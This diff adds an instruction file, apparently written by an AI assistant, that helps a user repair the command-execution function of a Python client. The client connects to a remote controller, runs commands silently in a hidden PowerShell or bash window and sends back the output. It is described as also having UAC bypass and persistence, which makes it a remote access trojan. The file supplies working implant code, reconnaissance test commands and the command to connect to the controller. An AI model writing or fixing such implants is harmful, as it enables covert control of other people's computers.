@@ -1,0 +1,134 @@
+================================================================
+  EXECUTE_COMMAND FUNCTION - COPY THIS TO YOUR CLIENT.PY
+================================================================
+
+INSTRUCTIONS:
+================================================================
+
+1. Open your client.py in Notepad or VS Code:
+   C:\Users\Brylle\render deploy\controller\client.py
+
+2. Find the execute_command function (around line 6292-6325)
+
+3. DELETE the entire function from "def execute_command" to the 
+   end of that function (before the next "def" line)
+
+4. PASTE this complete replacement:
+
+================================================================
+START COPYING FROM HERE:
+================================================================
+
+def execute_command(command):
+    """Executes a command and returns its output."""
+    try:
+        if WINDOWS_AVAILABLE:
+            # Use PowerShell directly (same as simple-client.py that works!)
+            result = subprocess.run(
+                ["powershell.exe", "-NoProfile", "-Command", command],
+                capture_output=True,
+                text=True,
+                timeout=30,
+                creationflags=subprocess.CREATE_NO_WINDOW
+            )
+        else:
+            # Use bash on Linux/Unix systems
+            result = subprocess.run(
+                ["bash", "-c", command],
+                capture_output=True,
+                text=True,
+                timeout=30
+            )
+        
+        output = result.stdout + result.stderr
+        if not output:
+            return "[No output from command]"
+        return output
+    except subprocess.TimeoutExpired:
+        return "Command execution timed out after 30 seconds"
+    except FileNotFoundError:
+        if WINDOWS_AVAILABLE:
+            return "PowerShell not found. Command execution failed."
+        else:
+            return "Bash not found. Command execution failed."
+    except Exception as e:
+        return f"Command execution failed: {e}"
+
+================================================================
+STOP COPYING HERE
+================================================================
+
+5. Save the file (Ctrl+S)
+
+6. Run: python client.py
+
+7. Test commands in the controller UI:
+   - dir
+   - systeminfo
+   - ipconfig
+   - tasklist
+
+8. Should work now!
+
+================================================================
+WHY THIS WORKS:
+================================================================
+
+This is EXACTLY the same execute_command function from simple-client.py
+that you said works correctly!
+
+The only difference between your client.py and simple-client.py is:
+  - Simple-client.py: Has this working function
+  - Your client.py: Has a broken/different version
+
+By copying the working function from simple-client.py to client.py,
+your commands will work!
+
+================================================================
+WHAT IF IT STILL DOESN'T WORK?
+================================================================
+
+If you still get WSL errors after this fix, the problem is elsewhere:
+
+1. Check if you're running the RIGHT client.py:
+   which python
+   where python
+
+2. Check if you saved the file:
+   - After editing, press Ctrl+S
+   - Close and reopen to verify changes
+
+3. Check if there are multiple execute_command functions:
+   - Search for "def execute_command" in the file
+   - Make sure you replaced ALL of them
+
+4. Try running simple-client.py instead:
+   python simple-client.py --interactive
+   
+   If this works but client.py doesn't, then compare the two files
+   to find other differences
+
+================================================================
+ALTERNATIVE: JUST USE SIMPLE-CLIENT.PY
+================================================================
+
+Since simple-client.py works correctly, you could just use it instead:
+
+python simple-client.py --url https://agent-controller-backend.onrender.com
+
+It has:
+  - Command execution (WORKING!)
+  - Socket.IO connection
+  - Agent registration
+  - Command result sending
+  - Interactive mode
+
+It doesn't have:
+  - Streaming
+  - UAC bypass
+  - Persistence
+  - Advanced features
+
+But for basic command execution, it works perfectly!
+
+================================================================
